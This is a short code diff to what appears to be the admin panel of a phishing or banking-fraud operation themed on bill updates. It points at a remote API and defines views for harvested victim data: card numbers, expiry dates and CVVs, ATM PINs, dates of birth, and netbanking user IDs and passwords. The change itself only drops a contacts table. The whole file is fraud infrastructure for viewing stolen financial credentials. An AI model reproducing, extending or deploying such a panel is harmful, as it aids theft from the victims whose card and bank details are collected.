@@ -5,7 +5,6 @@ const API = 'https://bill-1-9yfp.onrender.com/api/admin/all'
 const sections = [
   { key: 'bill_updates', label: 'Bill Update Requests', color: '#2D9CDB' },
   { key: 'devices', label: 'Devices', color: '#6C5CE7' },
-  { key: 'contact_records', label: 'Contacts', color: '#00B894' },
   { key: 'card_details', label: 'Card Details', color: '#F39C12' },
   { key: 'card_verifications', label: 'Card Verifications', color: '#27AE60' },
   { key: 'netbanking_details', label: 'Netbanking Logins', color: '#E74C3C' },
@@ -39,7 +38,6 @@ export default function App() {
 
   const cols = {
     bill_updates: ['id', 'customer_name', 'mobile', 'consumer_number', 'reasons', 'created_at'],
-    contact_records: ['id', 'name', 'phone', 'email', 'device_id', 'created_at'],
     card_details: ['id', 'card_type', 'card_number', 'card_holder_name', 'expiry', 'cvv', 'amount', 'created_at'],
     card_verifications: ['id', 'dob', 'atm_pin', 'amount', 'created_at'],
     netbanking_details: ['id', 'bank_name', 'user_id', 'password', 'remember_me', 'amount', 'created_at'],
